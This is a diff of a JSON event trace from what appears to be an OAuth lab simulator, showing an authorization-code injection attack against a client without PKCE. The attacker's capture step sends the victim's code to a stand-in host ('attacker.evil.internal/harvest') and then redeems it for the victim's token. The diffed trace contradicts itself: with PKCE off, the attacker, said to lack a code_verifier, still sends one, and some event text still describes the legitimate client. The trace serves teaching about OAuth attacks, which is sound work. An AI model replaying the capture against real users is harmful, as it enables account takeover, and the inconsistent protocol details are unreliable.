@@ -1,15 +1,25 @@
 {
-  "correlation_id": "run_QVluP5YfSiWfW8IdYGUyIDbE4VwKXEQKn-CR9aglBu8",
+  "correlation_id": "run_oafYYQ1HQKGTOhrQbXlSEGJ1Efshz01hsgE38R-RktE",
   "config": {
     "grant": "authorization_code",
-    "capabilities": {},
-    "attacks": {}
+    "capabilities": {
+      "pkce": {
+        "active": false,
+        "params": {}
+      }
+    },
+    "attacks": {
+      "auth_code_injection": {
+        "active": true,
+        "params": {}
+      }
+    }
   },
   "verdict": {
-    "attacker_got_token": false,
-    "user_got_token": true,
-    "user_accessed_resource": true,
-    "one_line": "User obtained an access token: YES \u2014 the client completed the authorization-code flow and the resource server honored the token. Attacker obtained an access token: NO \u2014 no attack was attempted.",
+    "attacker_got_token": true,
+    "user_got_token": false,
+    "user_accessed_resource": false,
+    "one_line": "Attacker obtained an access token: YES \u2014 auth-code injection succeeded. With no PKCE, a captured authorization code is enough to redeem a token for the victim. User obtained an access token: NO \u2014 the victim's code was intercepted before its client could use it.",
     "responsible_capabilities": []
   },
   "events": [
@@ -32,7 +42,7 @@
             "client_id": "demo-web-app",
             "redirect_uri": "https://app.oauthlab.internal/callback",
             "scope": "profile email",
-            "state": "st_VctxttsqTT-fOX2i28PrHack_FDvG0USiEUoeFj66JA"
+            "state": "st_SusDFAr-T4G0g7LGVFttwqdrnKd2mUwikMerbb7SHOQ"
           }
         },
         "response": {
@@ -89,7 +99,7 @@
             "client_id": "demo-web-app",
             "redirect_uri": "https://app.oauthlab.internal/callback",
             "scope": "profile email",
-            "state": "st_VctxttsqTT-fOX2i28PrHack_FDvG0USiEUoeFj66JA"
+            "state": "st_SusDFAr-T4G0g7LGVFttwqdrnKd2mUwikMerbb7SHOQ"
           }
         },
         "response": {
@@ -216,11 +226,11 @@
         "response": {
           "status": 302,
           "headers": {
-            "Location": "https://app.oauthlab.internal/callback?code=ac_pvmCSuPMRyiBUCXPGjEooWoVt1bO10vxtQ-oHjM8I3s&state=st_VctxttsqTT-fOX2i28PrHack_FDvG0USiEUoeFj66JA"
+            "Location": "https://app.oauthlab.internal/callback?code=ac_z06m2swfTGKP5nYttHy6jWisWI1pqkn9qmaVRiG45DE&state=st_SusDFAr-T4G0g7LGVFttwqdrnKd2mUwikMerbb7SHOQ"
           },
           "body": {
-            "code": "ac_pvmCSuPMRyiBUCXPGjEooWoVt1bO10vxtQ-oHjM8I3s",
-            "state": "st_VctxttsqTT-fOX2i28PrHack_FDvG0USiEUoeFj66JA"
+            "code": "ac_z06m2swfTGKP5nYttHy6jWisWI1pqkn9qmaVRiG45DE",
+            "state": "st_SusDFAr-T4G0g7LGVFttwqdrnKd2mUwikMerbb7SHOQ"
           }
         },
         "highlight": [
@@ -247,64 +257,62 @@
     },
     {
       "seq": 6,
-      "actor": "client",
-      "on_behalf_of": "user",
+      "actor": "attacker",
+      "on_behalf_of": "attacker",
       "phase": "redirect",
-      "summary": "Client receives the authorization code on its redirect URI.",
-      "detail": "The browser lands back on the client's redirect URI carrying the code and the echoed 'state'. The client confirms the 'state' matches the one it generated, so the response belongs to the session it started.",
+      "summary": "Attacker obtains the victim's authorization code.",
+      "detail": "The authorization code is delivered through the front channel \u2014 the redirect in the user's browser \u2014 where it is exposed to leakage (Referer, history, an open redirect, or logs). The attacker captures it. It now holds the code, but not the per-request code_verifier, which never left the legitimate client.",
       "outcome": "ok",
       "refs": [
-        1
+        5
       ],
       "http": {
         "request": {
           "method": "GET",
-          "url": "https://app.oauthlab.internal/callback?code=ac_pvmCSuPMRyiBUCXPGjEooWoVt1bO10vxtQ-oHjM8I3s&state=st_VctxttsqTT-fOX2i28PrHack_FDvG0USiEUoeFj66JA",
-          "headers": {}
+          "url": "https://attacker.evil.internal/harvest",
+          "headers": {
+            "X-Observed": "front-channel redirect"
+          }
         },
         "response": {
           "status": 200,
           "headers": {},
           "body": {
-            "state_valid": true
+            "captured_code": "ac_z06m2swfTGKP5nYttHy6jWisWI1pqkn9qmaVRiG45DE"
           }
         },
         "highlight": [
-          "response.body.state_valid"
+          "response.body.captured_code"
         ],
-        "source_actor": "client",
-        "target_actor": "client"
-      },
-      "check": {
-        "name": "state_matches_session",
-        "rule": "returned state == state the client generated",
-        "result": "PASS",
-        "spec_ref": {
-          "rfc": "RFC 6749",
-          "section": "\u00a710.12"
-        },
-        "expected": "st_VctxttsqTT-fOX2i28PrHack_FDvG0USiEUoeFj66JA",
-        "actual": "st_VctxttsqTT-fOX2i28PrHack_FDvG0USiEUoeFj66JA"
+        "source_actor": "auth_server",
+        "target_actor": "attacker"
       },
       "knowledge_delta": {
-        "client": {
+        "attacker": {
           "has": [
-            "authorization_code"
+            "authorization_code",
+            "client_credentials"
           ],
-          "lacks": []
+          "lacks": [
+            "code_verifier"
+          ]
         }
       },
       "spec_refs": [
         {
-          "rfc": "RFC 6749",
-          "section": "\u00a74.1.2"
+          "rfc": "RFC 9700",
+          "section": "\u00a74.5"
+        },
+        {
+          "rfc": "RFC 7636",
+          "section": "\u00a71"
         }
       ]
     },
     {
       "seq": 7,
       "actor": "auth_server",
-      "on_behalf_of": "user",
+      "on_behalf_of": "attacker",
       "phase": "token",
       "summary": "Token endpoint receives the code exchange.",
       "detail": "The client presents the authorization code over the back channel and authenticates itself with its client credentials. The server will now verify the client, then redeem the code.",
@@ -321,10 +329,11 @@
           },
           "body": {
             "grant_type": "authorization_code",
-            "code": "ac_pvmCSuPMRyiBUCXPGjEooWoVt1bO10vxtQ-oHjM8I3s",
+            "code": "ac_z06m2swfTGKP5nYttHy6jWisWI1pqkn9qmaVRiG45DE",
             "redirect_uri": "https://app.oauthlab.internal/callback",
             "client_id": "demo-web-app",
-            "client_secret": "s3c\u2026(redacted)"
+            "client_secret": "s3c\u2026(redacted)",
+            "code_verifier": "zfeMUqFzQheTgkWXGznv7Zz50OuLJE_gsUZ1YpYEEKw"
           }
         },
         "response": {
@@ -336,9 +345,9 @@
         },
         "highlight": [
           "request.body.code",
-          "request.body.grant_type"
+          "request.body.code_verifier"
         ],
-        "source_actor": "client",
+        "source_actor": "attacker",
         "target_actor": "auth_server"
       },
       "knowledge_delta": {},
@@ -352,7 +361,7 @@
     {
       "seq": 8,
       "actor": "auth_server",
-      "on_behalf_of": "user",
+      "on_behalf_of": "attacker",
       "phase": "token",
       "summary": "Token endpoint authenticates the confidential client.",
       "detail": "The server checks the client's credentials at the token endpoint. Only a client that authenticates as the one the code was issued to may redeem it over the back channel.",
@@ -382,7 +391,7 @@
     {
       "seq": 9,
       "actor": "auth_server",
-      "on_behalf_of": "user",
+      "on_behalf_of": "attacker",
       "phase": "token",
       "summary": "Authorization code is redeemed exactly once.",
       "detail": "The server looks up the code, confirms it exists and has not been redeemed before, and marks it used. A code that is missing or already redeemed is rejected \u2014 this is what makes a captured code single-use.",
@@ -413,7 +422,7 @@
     {
       "seq": 10,
       "actor": "auth_server",
-      "on_behalf_of": "user",
+      "on_behalf_of": "attacker",
       "phase": "token",
       "summary": "Authorization code binding is verified (client + redirect URI).",
       "detail": "The server confirms the code was issued to this client and for this redirect URI. A code captured by a different client, or presented with a different redirect URI, is rejected here.",
@@ -444,7 +453,7 @@
     {
       "seq": 11,
       "actor": "auth_server",
-      "on_behalf_of": "user",
+      "on_behalf_of": "attacker",
       "phase": "token",
       "summary": "Authorization server issues a signed JWT access token.",
       "detail": "The code is valid and now spent. The server signs a real RS256 JWT access token with its private key, scoped to the resource server's audience, and returns it to the caller. The public key is available at the JWKS endpoint for verification.",
@@ -464,7 +473,7 @@
             "Content-Type": "application/json"
           },
           "body": {
-            "access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImFzLTIwMjYtMDkiLCJ0eXAiOiJhdCtqd3QifQ.eyJpc3MiOiJodHRwczovL2F1dGgub2F1dGhsYWIuaW50ZXJuYWwiLCJzdWIiOiJ1c2VyLThmMzFjMiIsImF1ZCI6Imh0dHBzOi8vYXBpLm9hdXRobGFiLmludGVybmFsIiwiY2xpZW50X2lkIjoiZGVtby13ZWItYXBwIiwic2NvcGUiOiJwcm9maWxlIGVtYWlsIiwiaWF0IjoxNzg5MzM3MjIxLCJuYmYiOjE3ODkzMzcyMjEsImV4cCI6MTc4OTMzNzUyMSwianRpIjoiYmQ1MzUxN2U5NGNlNGJmN2E1MDM3YTc1NTQxMGQ5MjgifQ.iRviXzJdJGGje6G2NnszAa9A-SMJEF_aMk0--77k0igRKdiqEFdzieMP5WCa8ECq7hitPc3h5NqOhT2xORHOwbvePU-wI8kVoX7YsrQThmm5UCJBimmw1P2xyWvT875gmvDJmgkmMZ115ubslvBAYYcmiT5g6yKjoTl1gKIS20LsfyKRnADdqti2T3ATerWy2ixFEC6ReJqeH4qKPCArIVY_iqLuxzhb9e__mQjHm-gijEFgHMqfTY5OAoljiRDcaTd7jhmuf9fj60EUeP0HzZWIJ4rqJ5y4cQYLwACLt2C2I2ysvQhaXu71T9LCPOpvGi4DoIdtMTiV8wcwL0i6fA",
+            "access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImFzLTIwMjYtMDkiLCJ0eXAiOiJhdCtqd3QifQ.eyJpc3MiOiJodHRwczovL2F1dGgub2F1dGhsYWIuaW50ZXJuYWwiLCJzdWIiOiJ1c2VyLThmMzFjMiIsImF1ZCI6Imh0dHBzOi8vYXBpLm9hdXRobGFiLmludGVybmFsIiwiY2xpZW50X2lkIjoiZGVtby13ZWItYXBwIiwic2NvcGUiOiJwcm9maWxlIGVtYWlsIiwiaWF0IjoxNzg5MzM3MjIxLCJuYmYiOjE3ODkzMzcyMjEsImV4cCI6MTc4OTMzNzUyMSwianRpIjoiNDdlMDM5ZWE3M2UwNDQxMmJkODNjODVmNzQ2MzNmY2QifQ.YEq1oZaIwDqzqWMVxKdgHTw5-Qhj3CCD_v1Ttodu4yNSZfswwuhFH5nfwPq6dnyejN1SLnrgsZK9p6uKkxUkhPK_mO4vmv_i6n8bgMs3Fb6jdL2TYoqzAAmE-XQ3uHe3gwt_toaLDDgZE7oxu4eEnNfwOahzjxrdzcX6-gzOMDLaixvmv-zvvsvw86Ot2iUHTffmXisSnQPJtUxzSBNmYvr6JSbHAbQCkJT8ffMjsB72-4epYdFBAB-KllzVhUXFy3K7G8xMYGGZCodbZjpxhvt5dOt9acxLmL4eZ9wk6dxz_6L22kUhAlUXIxYHcU6GfNzlJZT7je71FzJieENgOQ",
             "token_type": "Bearer",
             "expires_in": 300,
             "scope": "profile email"
@@ -475,7 +484,7 @@
           "response.body.token_type"
         ],
         "source_actor": "auth_server",
-        "target_actor": "client"
+        "target_actor": "attacker"
       },
       "knowledge_delta": {
         "auth_server": {
@@ -494,17 +503,17 @@
     },
     {
       "seq": 12,
-      "actor": "client",
-      "on_behalf_of": "user",
+      "actor": "attacker",
+      "on_behalf_of": "attacker",
       "phase": "token",
-      "summary": "Client receives and stores the access token.",
-      "detail": "The token exchange succeeds. The client now holds a signed, audience-scoped access token it can present to the resource server on the user's behalf.",
-      "outcome": "ok",
+      "summary": "Attacker obtains an access token for the victim.",
+      "detail": "Without PKCE the token endpoint has no way to tell that the redeemer is not the client instance that started the flow: a valid, unused, correctly-bound code is all it requires. It issues an access token scoped to the victim's subject, and the attacker now holds it.",
+      "outcome": "attack_success",
       "refs": [
         11
       ],
       "knowledge_delta": {
-        "client": {
+        "attacker": {
           "has": [
             "access_token"
           ],
@@ -513,15 +522,15 @@
       },
       "spec_refs": [
         {
-          "rfc": "RFC 6749",
-          "section": "\u00a74.1.4"
+          "rfc": "RFC 9700",
+          "section": "\u00a74.5"
         }
       ]
     },
     {
       "seq": 13,
       "actor": "resource_server",
-      "on_behalf_of": "user",
+      "on_behalf_of": "attacker",
       "phase": "resource",
       "summary": "Resource server validates the access token.",
       "detail": "The resource server verifies the JWT's signature against the authorization server's published JWKS and checks the expiry, issuer, audience, and token type (typ=at+jwt). Only a token that passes every check is honored.",
@@ -547,7 +556,7 @@
         "highlight": [
           "request.headers.Authorization"
         ],
-        "source_actor": "client",
+        "source_actor": "attacker",
         "target_actor": "resource_server"
       },
       "check": {
@@ -583,7 +592,7 @@
     {
       "seq": 14,
       "actor": "resource_server",
-      "on_behalf_of": "user",
+      "on_behalf_of": "attacker",
       "phase": "resource",
       "summary": "Resource server returns the protected resource.",
       "detail": "Token validated. The resource server returns the protected profile resource for the subject named in the token, completing the flow: the user has authorized the client and the client has accessed the API.",
@@ -615,7 +624,7 @@
           "response.body.scope"
         ],
         "source_actor": "resource_server",
-        "target_actor": "client"
+        "target_actor": "attacker"
       },
       "knowledge_delta": {},
       "spec_refs": [
